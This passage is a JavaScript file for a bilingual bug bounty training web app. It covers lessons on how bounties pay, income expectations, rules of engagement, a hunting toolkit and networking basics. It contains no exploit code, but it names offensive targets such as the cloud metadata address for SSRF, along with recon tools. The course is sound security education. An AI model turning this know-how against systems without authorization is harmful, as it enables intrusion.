/* ============================================================
   FIRST BOUNTY — self-contained bug bounty training console.
   All "targets" are local, in-browser simulations. No real
   systems are ever contacted. Teaches the mechanism safely.
   ============================================================ */

/* ---------- tiny helpers ---------- */
const $ = (s,r=document)=>r.querySelector(s);
const el=(t,c,h)=>{const e=document.createElement(t);if(c)e.className=c;if(h!=null)e.innerHTML=h;return e;};
const esc=s=>String(s).replace(/[&<>"']/g,m=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m]));
const b64=s=>{try{return atob(s)}catch(e){return''}};

/* ---------- progress persistence ---------- */
const LS="firstbounty.v1";
let done=new Set();
(function load(){try{const r=localStorage.getItem(LS);if(r)done=new Set(JSON.parse(r));}catch(e){}})();
function save(){try{localStorage.setItem(LS,JSON.stringify([...done]));}catch(e){}}

/* ---------- copy-to-clipboard (with fallback) ---------- */
function copyText(t){return (navigator.clipboard&&navigator.clipboard.writeText)?navigator.clipboard.writeText(t):Promise.reject();}
function copyBtn(text,label){
  label=label||"Copy";
  const b=el("button","copybtn",label);
  b.onclick=()=>{
    const ok=()=>{b.textContent="Copied ✓";setTimeout(()=>b.textContent=label,1200);};
    copyText(text).then(ok).catch(()=>{
      try{const ta=document.createElement("textarea");ta.value=text;ta.style.position="fixed";ta.style.opacity="0";document.body.appendChild(ta);ta.focus();ta.select();document.execCommand&&document.execCommand("copy");document.body.removeChild(ta);ok();}
      catch(e){b.textContent="Select manually";}
    });
  };
  return b;
}
/* ---------- small localStorage JSON helpers ---------- */
function lsGetSet(key){try{const r=localStorage.getItem(key);return r?new Set(JSON.parse(r)):new Set();}catch(e){return new Set();}}
function lsSaveSet(key,set){try{localStorage.setItem(key,JSON.stringify([...set]));}catch(e){}}
function lsGetStr(key){try{return localStorage.getItem(key)||"";}catch(e){return"";}}
function lsSetStr(key,v){try{localStorage.setItem(key,v);}catch(e){}}

/* ---------- handle + daily streak (retention) ---------- */
function getHandle(){return lsGetStr("firstbounty.handle");}
function setHandle(v){lsSetStr("firstbounty.handle",v);}
function dayStr(d){return d.toLocaleDateString('en-CA');} // YYYY-MM-DD, local
const streak=(function(){
  let s={last:"",count:0,best:0};
  try{const r=localStorage.getItem("firstbounty.streak");if(r)s=JSON.parse(r);}catch(e){}
  const today=dayStr(new Date()),yday=dayStr(new Date(Date.now()-86400000));
  if(s.last!==today){
    s.count=(s.last===yday)?(s.count||0)+1:1;
    s.last=today;s.best=Math.max(s.best||0,s.count);
    try{localStorage.setItem("firstbounty.streak",JSON.stringify(s));}catch(e){}
  }
  return s;
})();

/* ============================================================
   CONFIG — edit these to make the course your own before publishing
   ============================================================ */
const CONFIG={
  // ↓ Replace with your real link (Tally / ConvertKit / Gumroad / Discord invite).
  waitlistUrl:"https://tally.so/r/REPLACE_ME",
  communityUrl:"",   // optional second link (e.g. Discord). Leave "" to hide.
  instructor:{
    name:"Stavros Papasotiropoulos",
    tagline:{en:"Security practitioner · learning in public",gr:"Επαγγελματίας ασφάλειας · μαθαίνω δημόσια"},
    creds:["eCPPT","SAL1","ex-SOC L1 Analyst","Engineer"],
    bio:{
      en:"I'm learning bug bounty the honest way and building this course as I go — no gurus, no hype. Background in offensive security (eCPPT, SAL1) and a former SOC analyst, now hunting and documenting the journey in the open. If I can get to a first bounty, so can you — let's do it together.",
      gr:"Μαθαίνω bug bounty με τον ειλικρινή τρόπο και φτιάχνω αυτό το course καθώς προχωράω — χωρίς γκουρού, χωρίς υπερβολές. Υπόβαθρο σε offensive security (eCPPT, SAL1) και πρώην SOC analyst· τώρα κυνηγάω και καταγράφω τη διαδρομή ανοιχτά. Αν φτάσω εγώ στο πρώτο bounty, μπορείς κι εσύ — ας το κάνουμε μαζί."
    },
    links:[["Portfolio","https://spapasotiropoulos.com"],["LinkedIn","https://www.linkedin.com/in/stavros-papasotiropoulos-b35302200"],["GitHub","https://github.com/StevePapasot"]]
  }
};

/* ============================================================
   i18n — EN / GR shell (lesson bodies stay English: the field's language)
   ============================================================ */
let LANG=(lsGetStr("firstbounty.lang")==="gr")?"gr":"en";
const I18N={
  en:{
    tag:"bug bounty · zero → income",
    "nav.home":"▚  ROADMAP / HOME","nav.tools":"Operator tools","nav.manual":"Field Manual","nav.arsenal":"Arsenal","nav.report":"Report Builder","nav.tracker":"Hunt Tracker","nav.cert":"Certificate","nav.capstone":"Capstone Exam","nav.curriculum":"Curriculum",
    "hero.eyebrow":"// Learn to hunt — ethically, hands-on, for real",
    "hero.h":'From <span class="goal">networking fundamentals</span> to your first <span class="goal">€400–600/month</span> in bug bounty.',
    "hero.p":"A free, hands-on course with real theory, safe in-browser labs and CTF challenges — no fluff, no \"go read this blog\". Every target is a local simulation, so you learn the exact mechanics without ever touching a real system. Pick a specialty, go deep, get paid.",
    "cta.start":"▶ Start free","cta.spec":"Choose a specialty","cta.share":"⇪ Share progress",
    "stat.lessons":"Lessons","stat.labs":"Labs & CTFs","stat.complete":"Complete","stat.xp":"XP earned","stat.streak":"Day streak","stat.rank":"Rank",
    "how.label":"How it works","how.1h":"Learn the mechanism","how.1p":"Short, honest theory for each bug class — the why, not just the what.","how.2h":"Break it in the lab","how.2p":"Exploit a safe, sandboxed simulation right in your browser. Capture the flag.","how.3h":"Run the playbook","how.3p":"Take the Field Manual methodology to authorized programs — and report for real.",
    "money.nt":"Read this first","money.body":"The €400–600 goal is real but it's a <strong>6–12 month climb</strong>, not a quick win — and it's lumpy (€0 one month, €900 the next). Module 00 breaks down the honest math. Work ~12 focused hours a week, specialize in 2 bug types, and judge yourself on 3-month averages. No hype here — just the mechanics and the method that actually get beginners paid.",
    "sec.roadmap":"The roadmap","sec.specChoose":"Choose your specialty","sec.specYour":"Your specialty · mastery path","sec.about":"Who's behind this",
    "spec.intro":"Depth beats breadth — the hunters who earn consistently are deep in 2–3 bug classes, not shallow across twenty. Pick one lane to focus first. The whole course stays open; this just builds you a mastery path and tracks it. You can switch anytime.",
    "spec.rec":"Recommended for you","spec.pick":"Focus this lane →","spec.mastered":"mastered","spec.steps":"steps","spec.change":"Change lane","spec.manual":"Open the Field Manual for this lane →",
    "foot.main":"<strong>First Bounty</strong> — a free, hands-on, ethical bug bounty course. Every target is a local simulation in your browser.","foot.sub":"Only ever test systems you're authorized to test. Your progress is saved privately on this device — no account, no tracking.",
    "wl.title":"Learn bug bounty with me — get the next lessons & community","wl.body":"New modules, write-ups from real (authorized) hunting, and a spot in the community. Free to join.","wl.btn":"Join the waitlist →","wl.community":"Join the community →",
    "ab.by":"Built by","ab.disclaimer":"Honest positioning: this is a learning-in-public project, not an \"expert\" selling secrets. Credentials shown are real and self-reported.",
    "cert.title":"Your Certificate","cert.sub":"A shareable snapshot of the reps you've actually put in","cert.handleLabel":"Your hacker handle — shown on the certificate & share text","cert.certifies":"This certifies that","cert.anon":"Anonymous Hunter","cert.desc":"has trained in ethical bug bounty hunting on First Bounty — completing hands-on labs and CTF challenges across web and network security, from the TCP/IP stack to real-world vulnerability classes.","cert.complete":"Course complete","cert.rank":"Rank attained","cert.labs":"Labs & CTFs","cert.xp":"XP earned","cert.issued":"Issued","cert.selfpaced":"Self-paced · practice only on authorized systems","cert.copy":"⇪ Copy share text","cert.back":"← Back to roadmap","cert.note":"Screenshot the certificate to share it — artifacts can't download or print. It records the reps you've actually done: honest and self-paced, no proctor.","cert.sealVerified":"CERTIFIED HUNTER","cert.sealComplete":"COURSE COMPLETE","cert.gateTitle":"One step left to get verified","cert.gateBody":"Your certificate becomes a <strong>verified</strong>, shareable credential once you pass the Capstone Exam — a randomized final across the whole course. Clicking through doesn't earn it; passing does.","cert.gateBtn":"Take the Capstone Exam →",
    "cap.title":"Capstone Exam","cap.sub":"Pass this to earn your verified certificate — it's what makes the credential mean something","cap.intro":"A randomized final across the whole course: networking, web vulnerability classes, methodology, ethics and reporting. 12 questions, drawn fresh each attempt. You need <strong>10/12 (83%)</strong> to pass. No time limit, unlimited retakes — but it's meant to be earned.","cap.start":"▶ Start the exam","cap.submit":"Submit exam","cap.retake":"Retake exam","cap.qof":"Question","cap.of":"of","cap.answered":"answered","cap.passTitle":"Passed — you're a Certified Hunter.","cap.failTitle":"Not yet — review and retake.","cap.score":"Your score","cap.pass":"pass mark 10/12","cap.review":"Worth reviewing:","cap.goCert":"View your verified certificate →","cap.passedBadge":"✓ Capstone passed","cap.notPassed":"Not passed yet","cap.needAll":"Answer all 12 questions first.",
    "lt.theory":"Theory","lt.lab":"Hands-on Lab","lt.ctf":"CTF Challenge","lt.quiz":"Knowledge Check","l.xp":"XP","l.completed":"completed","l.mark":"Mark complete","l.marked":"✓ Completed","l.next":"Next:","l.back":"Back to roadmap →","l.solve":"Solve the challenge above to complete","l.solved":"✓ Solved — XP awarded","l.enLessons":"Lesson content is in English — the working language of bug bounty (reports, platforms, payloads)."
  },
  gr:{
    tag:"bug bounty · από το μηδέν",
    "nav.home":"▚  ΧΑΡΤΗΣ / ΑΡΧΙΚΗ","nav.tools":"Εργαλεία","nav.manual":"Εγχειρίδιο Πεδίου","nav.arsenal":"Οπλοστάσιο","nav.report":"Σύνταξη Αναφοράς","nav.tracker":"Ημερολόγιο Κυνηγιού","nav.cert":"Πιστοποιητικό","nav.capstone":"Τελικές Εξετάσεις","nav.curriculum":"Ύλη",
    "hero.eyebrow":"// Μάθε να κυνηγάς — ηθικά, πρακτικά, στ' αλήθεια",
    "hero.h":'Από τα <span class="goal">θεμέλια των δικτύων</span> στα πρώτα σου <span class="goal">€400–600/μήνα</span> σε bug bounty.',
    "hero.p":"Ένα δωρεάν, πρακτικό course με πραγματική θεωρία, ασφαλή labs μέσα στον browser και CTF challenges — χωρίς φλυαρίες, χωρίς «πήγαινε διάβασε αυτό το blog». Κάθε στόχος είναι τοπικό simulation, ώστε να μαθαίνεις τον ακριβή μηχανισμό χωρίς να αγγίζεις ποτέ πραγματικό σύστημα. Διάλεξε ειδίκευση, πήγαινε σε βάθος, πληρώσου.",
    "cta.start":"▶ Ξεκίνα δωρεάν","cta.spec":"Διάλεξε ειδίκευση","cta.share":"⇪ Μοιράσου την πρόοδο",
    "stat.lessons":"Μαθήματα","stat.labs":"Labs & CTFs","stat.complete":"Ολοκληρωμένο","stat.xp":"XP","stat.streak":"Σερί ημερών","stat.rank":"Βαθμός",
    "how.label":"Πώς λειτουργεί","how.1h":"Μάθε τον μηχανισμό","how.1p":"Σύντομη, ειλικρινής θεωρία για κάθε κατηγορία bug — το γιατί, όχι μόνο το τι.","how.2h":"Σπάσ' το στο lab","how.2p":"Εκμεταλλεύσου ένα ασφαλές, απομονωμένο simulation μέσα στον browser σου. Πιάσε το flag.","how.3h":"Τρέξε το playbook","how.3p":"Πάρε τη μεθοδολογία του Εγχειριδίου σε εξουσιοδοτημένα προγράμματα — και κάνε report στ' αλήθεια.",
    "money.nt":"Διάβασε πρώτα αυτό","money.body":"Ο στόχος των €400–600 είναι πραγματικός, αλλά είναι <strong>ανηφόρα 6–12 μηνών</strong>, όχι γρήγορη νίκη — και έρχεται κομματιαστά (€0 τον έναν μήνα, €900 τον άλλον). Το Module 00 αναλύει τα ειλικρινή μαθηματικά. Δούλεψε ~12 συγκεντρωμένες ώρες/βδομάδα, ειδικεύσου σε 2 κατηγορίες bug, και κρίνε τον εαυτό σου σε τρίμηνους μέσους όρους. Χωρίς υπερβολές — μόνο οι μηχανισμοί και η μέθοδος που πραγματικά πληρώνουν τους αρχάριους.",
    "sec.roadmap":"Ο χάρτης πορείας","sec.specChoose":"Διάλεξε την ειδίκευσή σου","sec.specYour":"Η ειδίκευσή σου · μονοπάτι εξειδίκευσης","sec.about":"Ποιος είναι πίσω από αυτό",
    "spec.intro":"Το βάθος νικά το πλάτος — όσοι κερδίζουν σταθερά είναι βαθιά σε 2–3 κατηγορίες bug, όχι ρηχά σε είκοσι. Διάλεξε μία λωρίδα για αρχή. Όλο το course μένει ανοιχτό· αυτό απλώς σου φτιάχνει ένα μονοπάτι εξειδίκευσης και το παρακολουθεί. Αλλάζεις όποτε θες.",
    "spec.rec":"Προτείνεται για σένα","spec.pick":"Εστίασε εδώ →","spec.mastered":"κατακτημένο","spec.steps":"βήματα","spec.change":"Άλλαξε λωρίδα","spec.manual":"Άνοιξε το Εγχειρίδιο γι' αυτή τη λωρίδα →",
    "foot.main":"<strong>First Bounty</strong> — ένα δωρεάν, πρακτικό, ηθικό course για bug bounty. Κάθε στόχος είναι τοπικό simulation στον browser σου.","foot.sub":"Δοκίμαζε μόνο συστήματα που έχεις εξουσιοδότηση να ελέγξεις. Η πρόοδός σου αποθηκεύεται ιδιωτικά σε αυτή τη συσκευή — χωρίς λογαριασμό, χωρίς tracking.",
    "wl.title":"Μάθε bug bounty μαζί μου — πάρε τα επόμενα μαθήματα & την κοινότητα","wl.body":"Νέα modules, write-ups από πραγματικό (εξουσιοδοτημένο) κυνήγι, και θέση στην κοινότητα. Δωρεάν εγγραφή.","wl.btn":"Μπες στη λίστα αναμονής →","wl.community":"Μπες στην κοινότητα →",
    "ab.by":"Από τον","ab.disclaimer":"Ειλικρινής τοποθέτηση: αυτό είναι ένα project «μαθαίνω δημόσια», όχι ένας «ειδικός» που πουλάει μυστικά. Τα credentials είναι αληθινά και δηλωμένα από εμένα.",
    "cert.title":"Το Πιστοποιητικό σου","cert.sub":"Ένα κοινοποιήσιμο στιγμιότυπο της δουλειάς που έχεις όντως βάλει","cert.handleLabel":"Το hacker handle σου — εμφανίζεται στο πιστοποιητικό & στο κείμενο κοινοποίησης","cert.certifies":"Πιστοποιείται ότι ο/η","cert.anon":"Ανώνυμος Κυνηγός","cert.desc":"εκπαιδεύτηκε στο ηθικό bug bounty hunting στο First Bounty — ολοκληρώνοντας πρακτικά labs και CTF challenges σε web και network security, από το TCP/IP stack μέχρι πραγματικές κατηγορίες ευπαθειών.","cert.complete":"Ολοκλήρωση","cert.rank":"Βαθμός","cert.labs":"Labs & CTFs","cert.xp":"XP","cert.issued":"Εκδόθηκε","cert.selfpaced":"Αυτορυθμιζόμενο · εξάσκηση μόνο σε εξουσιοδοτημένα συστήματα","cert.copy":"⇪ Αντιγραφή κειμένου","cert.back":"← Πίσω στον χάρτη","cert.note":"Βγάλε screenshot το πιστοποιητικό για να το μοιραστείς — τα artifacts δεν κατεβάζουν/εκτυπώνουν. Καταγράφει τη δουλειά που έχεις όντως κάνει: ειλικρινά και αυτορυθμιζόμενα.","cert.sealVerified":"ΠΙΣΤΟΠΟΙΗΜΕΝΟΣ","cert.sealComplete":"ΟΛΟΚΛΗΡΩΜΕΝΟ","cert.gateTitle":"Ένα βήμα ακόμη για πιστοποίηση","cert.gateBody":"Το πιστοποιητικό σου γίνεται <strong>πιστοποιημένο</strong>, κοινοποιήσιμο credential μόλις περάσεις τις Τελικές Εξετάσεις — ένα τυχαιοποιημένο τεστ σε όλο το course. Το κλικ δεν το κερδίζει· το πέρασμα ναι.","cert.gateBtn":"Δώσε τις Τελικές Εξετάσεις →",
    "cap.title":"Τελικές Εξετάσεις","cap.sub":"Πέρασέ τες για να κερδίσεις το πιστοποιημένο σου certificate — αυτό δίνει αξία στο credential","cap.intro":"Ένα τυχαιοποιημένο τεστ σε όλο το course: δίκτυα, κατηγορίες web ευπαθειών, μεθοδολογία, ηθική και reporting. 12 ερωτήσεις, διαφορετικές κάθε φορά. Χρειάζεσαι <strong>10/12 (83%)</strong> για να περάσεις. Χωρίς χρονικό όριο, απεριόριστες προσπάθειες — αλλά πρέπει να κερδηθεί.","cap.start":"▶ Ξεκίνα το τεστ","cap.submit":"Υποβολή","cap.retake":"Ξαναδώσ' το","cap.qof":"Ερώτηση","cap.of":"από","cap.answered":"απαντήθηκαν","cap.passTitle":"Πέρασες — είσαι Πιστοποιημένος Κυνηγός.","cap.failTitle":"Όχι ακόμη — ανασκόπησε και ξαναδώσ' το.","cap.score":"Το σκορ σου","cap.pass":"βάση 10/12","cap.review":"Αξίζει ανασκόπηση:","cap.goCert":"Δες το πιστοποιημένο σου certificate →","cap.passedBadge":"✓ Οι εξετάσεις πέρασαν","cap.notPassed":"Δεν πέρασε ακόμη","cap.needAll":"Απάντησε και στις 12 ερωτήσεις πρώτα.",
    "lt.theory":"Θεωρία","lt.lab":"Πρακτικό Lab","lt.ctf":"CTF Challenge","lt.quiz":"Έλεγχος Γνώσεων","l.xp":"XP","l.completed":"ολοκληρώθηκε","l.mark":"Σήμανση ως ολοκληρωμένο","l.marked":"✓ Ολοκληρώθηκε","l.next":"Επόμενο:","l.back":"Πίσω στον χάρτη →","l.solve":"Λύσε το challenge πιο πάνω για να ολοκληρώσεις","l.solved":"✓ Λύθηκε — κερδήθηκε XP","l.enLessons":"Το περιεχόμενο των μαθημάτων είναι στα Αγγλικά — τη γλώσσα εργασίας του bug bounty (reports, platforms, payloads)."
  }
};
function t(k){const d=I18N[LANG]||I18N.en;return (d&&d[k]!=null)?d[k]:(I18N.en[k]!=null?I18N.en[k]:k);}
function instr(field){const v=CONFIG.instructor[field];return (v&&typeof v==="object")?(v[LANG]||v.en):v;}
function applyLang(){
  const tag=$("#brandTag");if(tag)tag.textContent=t("tag");
  const lb=$("#langToggle");if(lb)lb.textContent=(LANG==="gr"?"GR":"EN");
  document.documentElement.lang=LANG;
}
function rerenderCurrent(){
  if(currentView==="lesson"&&currentLesson)openLesson(currentLesson);
  else if(currentView==="arsenal")renderArsenal();
  else if(currentView==="manual")renderFieldManual();
  else if(currentView==="report")renderReport();
  else if(currentView==="tracker")renderTracker();
  else if(currentView==="certificate")renderCertificate();
  else if(currentView==="capstone")renderCapstone();
  else renderHome();
}
function toggleLang(){
  LANG=(LANG==="gr")?"en":"gr";lsSetStr("firstbounty.lang",LANG);
  applyLang();renderSidebar();rerenderCurrent();
}

/* XP + rank */
const XP={theory:10,lab:25,ctf:25,quiz:15};
const RANKS=[[0,"Recon Rookie"],[20,"Script Apprentice"],[40,"Bug Hunter"],[60,"Exploit Engineer"],[80,"Bounty Hunter"],[100,"Zero-Day Zealot"]];

/* ============================================================
   CURRICULUM
   ============================================================ */
const COURSE=[
{code:"MOD_00",title:"Start Here: The Game",blurb:"How bounties really pay, the honest €400–600 math, program selection, and the rules you never break.",lessons:[
  {id:"0.1",type:"theory",title:"How bug bounty actually works",html:`
    <p>A bug bounty program is a company saying, in writing: <strong>"Here is a list of our systems. If you find a security flaw and report it the right way, we'll pay you."</strong> That written invitation is the entire reason this is legal. No invitation, no scope, no testing — that's just crime.</p>
    <p>You hunt on a <strong>platform</strong> (HackerOne, Bugcrowd, Intigriti, YesWeHack) that sits between you and the company. You find a bug, write a report, the company's triage team reproduces it, assigns a severity, and pays a bounty tied to that severity.</p>
    <h3>What a bug is "worth"</h3>
    <p>Payouts scale with <strong>impact</strong>, not effort. A one-character change that dumps every user's data pays more than a week of work that only crashes your own session. Severity usually follows a CVSS-style scale:</p>
    <p>
      <span class="sev crit">Critical</span> remote code execution, full account takeover at scale, dumping the whole database.<br>
      <span class="sev high">High</span> accessing other users' data (IDOR), stored XSS hitting other users, auth bypass.<br>
      <span class="sev med">Medium</span> reflected XSS, CSRF on sensitive actions, some SSRF, open redirect chains.<br>
      <span class="sev low">Low</span> / <span class="sev info">Info</span> missing headers, self-XSS, verbose errors — usually little or no money.
    </p>
    <div class="note"><span class="nt">Mentor note</span><p>You already have a head start most beginners don't: eCPPT + SOC experience means you understand HTTP, networks, and how attacks look. The gap between you and your first bounty is <strong>web-app depth + the grind</strong>, not fundamentals. We'll move fast where you're strong and slow where it pays.</p></div>
    <h3>Your edge as a beginner</h3>
    <p>You will <em>not</em> out-hunt full-time pros on a critical RCE in Google's core. That's fine — that's not where consistent beginner income comes from. Your money comes from <strong>high-frequency, reliably-payable bugs</strong> that pros often skip because they're chasing bigger game: access control (IDOR), info disclosure, subdomain takeover, misconfigurations. Boring to them, rent money to you.</p>`},
  {id:"0.2",type:"theory",title:"The honest €400–600/month math",html:`
    <p>You asked for a straight answer, so here it is with no sugar: <strong>€400–600/month consistently is a real, reachable goal — but almost nobody hits it in their first 1–3 months, and most people quit before they do.</strong> The ones who make it treat it like a skill with a learning curve, not a lottery.</p>
    <h3>What that number looks like in bugs</h3>
    <p>€400–600 ≈ a handful of valid low/medium reports a month, or one solid high. Rough European-platform ballpark:</p>
    <table class="money-tbl">
      <tr><th>Bug type</th><th>Typical bounty</th><th>To hit €500/mo</th></tr>
      <tr><td>Info disclosure / misconfig</td><td>€50–150</td><td>~4–8 valid/mo</td></tr>
      <tr><td>IDOR / access control</td><td>€150–600</td><td>~1–3 valid/mo</td></tr>
      <tr><td>Reflected XSS</td><td>€100–400</td><td>~2–4 valid/mo</td></tr>
      <tr><td>Stored XSS / auth bypass</td><td>€400–1500+</td><td>~1 good one</td></tr>
      <tr><td>Subdomain takeover</td><td>€100–500</td><td>~1–4 valid/mo</td></tr>
    </table>
    <div class="note money"><span class="nt">The realistic timeline</span><p>With ~10–15 focused hours/week and your background: expect <strong>€0 for roughly the first 2–4 months</strong> (learning + duplicates + rejections), first real payouts around <strong>months 3–6</strong>, and a shot at a <strong>€400–600 monthly average by months 6–12</strong>. The income is lumpy — €0 one month, €900 the next. Judge yourself on a 3-month average, never one month.</p></div>
    <h3>Why most people fail (so you don't)</h3>
    <ul>
      <li><strong>They chase criticals on huge targets.</strong> Everything's already found. You get nothing but duplicates.</li>
      <li><strong>They quit during the "duplicate valley."</strong> Your first 20 reports may all be dupes or N/A. That's tuition, not failure.</li>
      <li><strong>They spray low-quality reports.</strong> This tanks your reputation score and gets you fewer private invites — where the real money is.</li>
      <li><strong>They never pick a lane.</strong> Generalists starve. Specialists eat. We'll make you deep on 2–3 bug classes.</li>
    </ul>
    <div class="note warn"><span class="nt">Reality check</span><p>If you need €500 <em>this month</em> to pay rent, bug bounty is the wrong tool — it's too lumpy and too slow to start. Treat it as a skill investment that <em>becomes</em> reliable income, funded by your day job at 731 ΔΣΕ while you learn. That pressure-free runway is itself a huge advantage.</p></div>`},
  {id:"0.3",type:"theory",title:"Rules of engagement (never break these)",html:`
    <p>This is the most important lesson in the whole course. Break these and you don't lose a bounty — you catch a criminal charge. In Greece and the EU, unauthorized access to a computer system is a crime regardless of intent.</p>
    <h3>The non-negotiables</h3>
    <ul>
      <li><strong>Only test what's in scope.</strong> Every program has a scope page listing exact domains/apps you may test. If it's not listed, it's off-limits — full stop.</li>
      <li><strong>Read the scope twice before touching anything.</strong> <code>*.example.com</code> in scope does not mean <code>example-partner.com</code> is. Subsidiaries, acquisitions, and third-party services are usually out unless named.</li>
      <li><strong>Respect "safe harbor".</strong> Good programs include a safe-harbor clause promising they won't sue you if you follow the rules. No safe harbor + aggressive testing = legal risk. Favor programs that have it.</li>
      <li><strong>No destructive testing.</strong> Never delete data, run <code>DROP TABLE</code> for real, DoS a target, brute-force logins, or pivot deeper into internal systems after you prove a bug. Prove minimum impact, then stop and report.</li>
      <li><strong>Don't touch other users' data for real.</strong> To prove an IDOR, use two accounts <em>you</em> control. Never actually read a stranger's private records.</li>
      <li><strong>Automated scanning is usually banned or rate-limited.</strong> Hammering a target with a scanner gets you banned and can break production.</li>
    </ul>
    <div class="note warn"><span class="nt">This is why this app exists</span><p>You asked me <strong>not</strong> to hack real targets while learning — exactly right. Every lab and CTF in First Bounty is a <strong>local simulation running in your own browser</strong>. You practice the exact mechanics safely, then take those skills to <em>authorized, in-scope</em> programs only. Never point these techniques at a system you don't have written permission to test.</p></div>
    <h3>When you DO start on real programs</h3>
    <p>Set your testing identity: a dedicated browser profile, a header like <code>X-Bug-Bounty: your-handle</code> on your requests so their SOC knows it's a researcher, and a slow, surgical pace. You want to look like a careful guest, not an attacker.</p>`},
  {id:"0.4",type:"theory",title:"Your toolkit & weekly routine",html:`
    <p>You don't need expensive gear. The free tier of everything is enough to earn your first few thousand euros.</p>
    <h3>The core kit (all free)</h3>
    <ul>
      <li><strong>Burp Suite Community</strong> — the intercepting proxy. This is where you'll live: capture requests, modify them, replay them. The paid "Pro" scanner is nice later; Community is plenty to start.</li>
      <li><strong>Firefox</strong> with the <strong>FoxyProxy</strong> extension — a clean browser dedicated to hunting, routed through Burp.</li>
      <li><strong>A recon stack</strong> — <code>subfinder</code>, <code>httpx</code>, <code>ffuf</code> (content discovery), <code>nuclei</code> (template scanner). Command-line, free, fast.</li>
      <li><strong>A notes system</strong> — Obsidian or plain Markdown. You will forget what you tested. Notes are what separate pros from tourists.</li>
    </ul>
    <div class="note"><span class="nt">Mentor note</span><p>Your ADACOM/eCPPT background means Burp and the CLI tools won't scare you. Spend one evening wiring Firefox → FoxyProxy → Burp and importing Burp's CA cert so HTTPS intercepts cleanly. That single setup is the gate 80% of beginners stumble at.</p></div>
    <h3>A sustainable weekly routine (~12 hrs)</h3>
    <table class="money-tbl">
      <tr><th>Block</th><th>Time</th><th>What</th></tr>
      <tr><td>Learn</td><td>3 hrs</td><td>One bug class deep — theory + a lab here + PortSwigger Academy reps.</td></tr>
      <tr><td>Recon</td><td>3 hrs</td><td>Map one target's attack surface, build a list of endpoints to test.</td></tr>
      <tr><td>Hunt</td><td>5 hrs</td><td>Methodically test your mapped surface for this week's bug class.</td></tr>
      <tr><td>Report & review</td><td>1 hr</td><td>Write up anything found; review what didn't work and why.</td></tr>
    </table>
    <p>Consistency beats intensity. Twelve focused hours every week for six months will put you ahead of someone who binges 40 hours once and burns out.</p>`},
  {id:"0.5",type:"quiz",title:"Checkpoint: the game",quiz:[
    {q:"A program's scope lists *.acme.com. You find a juicy login at acme-labs.io owned by the same company. What do you do?",opts:["Test it — same company","Leave it alone; it's not in scope","Test gently and only report if you find something"],a:1,ex:"Out of scope is out of scope, even for the same company. Report-worthy only if the program later adds it. Testing it is unauthorized access."},
    {q:"You've submitted 15 reports and every one was a duplicate or N/A. This means:",opts:["Bug bounty doesn't work for you","You're in the normal 'duplicate valley' — keep going, adjust targets","You should only hunt criticals now"],a:1,ex:"Early duplicates are tuition. The fix is usually picking less-saturated programs and deeper bug classes, not quitting."},
    {q:"Which bug type is the most reliable bread-and-butter income for a beginner?",opts:["Critical RCE on a Fortune 500","Access control / IDOR on mid-size programs","Theoretical bugs with no real impact"],a:1,ex:"IDOR and broken access control are common, high-frequency, and pay well — exactly the lane for consistent beginner income."}
  ]}
]},

{code:"MOD_NET",title:"Networking Foundations",blurb:"The layer beneath every web bug. Packets, IP & subnets, ports, DNS, TLS and the infra in between — with interactive tools.",lessons:[
  {id:"net.1",type:"theory",title:"Why the wire is your foundation",html:`
    <p>Every bug you'll ever find rides on top of a network. A hunter who understands how a request physically travels — from a URL in a browser to bytes on a server and back — sees opportunities others miss: why an SSRF can reach <code>169.254.169.254</code>, why DNS gives up a hidden subdomain, why Burp can read "encrypted" HTTPS, why a WAF can be stepped around. Skip this layer and you're memorizing payloads without understanding why they work.</p>
    <h3>Two maps of the same territory</h3>
    <p>We describe networks in layers — each layer does one job and hands off to the next. Two models are used:</p>
    <table class="money-tbl">
      <tr><th>OSI (7)</th><th>TCP/IP (4)</th><th>What lives here</th><th>Hunter's interest</th></tr>
      <tr><td>7 Application</td><td rowspan="3">Application</td><td>HTTP, DNS, TLS, FTP</td><td>Where ~95% of web bugs live</td></tr>
      <tr><td>6 Presentation</td><td>Encoding, TLS encryption</td><td>Cert trust, interception</td></tr>
      <tr><td>5 Session</td><td>Sessions, state</td><td>Session handling flaws</td></tr>
      <tr><td>4 Transport</td><td>Transport</td><td>TCP, UDP, ports</td><td>Port recon, service discovery</td></tr>
      <tr><td>3 Network</td><td>Internet</td><td>IP, routing, ICMP</td><td>Internal ranges, SSRF targets</td></tr>
      <tr><td>2 Data Link</td><td rowspan="2">Link</td><td>MAC, Ethernet, ARP</td><td>LAN attacks (less in bounty)</td></tr>
      <tr><td>1 Physical</td><td>Cables, Wi-Fi</td><td>Rarely relevant to web</td></tr>
    </table>
    <h3>Encapsulation — the envelope in an envelope</h3>
    <p>As your data goes down the stack, each layer wraps it in its own header, like nesting envelopes: your HTTP request (L7) is placed inside a TCP segment (L4) with a port, inside an IP packet (L3) with addresses, inside a frame (L2). The server unwraps them in reverse. When you tamper a request in Burp you're editing the <strong>innermost letter (L7)</strong>; the lower layers just carry it.</p>
    <div class="note"><span class="nt">Mentor note</span><p>You don't need to route packets for a living — but you do need a mental model of this stack. The next lessons build each layer that matters, and every one ends by connecting back to a real bug class.</p></div>`},
  {id:"net.2",type:"lab",title:"Lab: OSI layer explorer",lab:"osi",html:`
    <p>Click through all seven layers below. For each, you'll see its job, the data unit it uses, example protocols, and — most importantly — what a bug hunter does at that layer. Visit every layer to complete the lab.</p>`},
  {id:"net.3",type:"theory",title:"IP addressing & subnetting",html:`
    <p>Layer 3 is about <em>addresses</em>. Every device on a network has an IP address; routing is how packets find their way between them. Understanding IP ranges tells you what's "internal", what's reachable, and where SSRF and recon point.</p>
    <h3>IPv4 anatomy</h3>
    <p>An IPv4 address is 32 bits, written as four octets: <code>192.168.1.10</code>. Part of it identifies the <strong>network</strong>, the rest the <strong>host</strong> — the split is set by the <strong>subnet mask</strong> / CIDR suffix.</p>
    <pre><code>192.168.1.10 /24
<span class="cmt">│         │  └─ /24 = first 24 bits are network</span>
<span class="cmt">│         └──── host part = last 8 bits (256 addresses)</span>
network: 192.168.1.0   broadcast: 192.168.1.255
usable hosts: 192.168.1.1 – 192.168.1.254  (254)</code></pre>
    <h3>The ranges you must recognize on sight</h3>
    <ul>
      <li><strong>Private (RFC 1918)</strong> — not routable on the internet: <code>10.0.0.0/8</code>, <code>172.16.0.0/12</code>, <code>192.168.0.0/16</code>. See these in an SSRF response and you've reached an internal network.</li>
      <li><strong>Loopback</strong> — <code>127.0.0.0/8</code> (localhost). The SSRF target you learned to bypass filters for.</li>
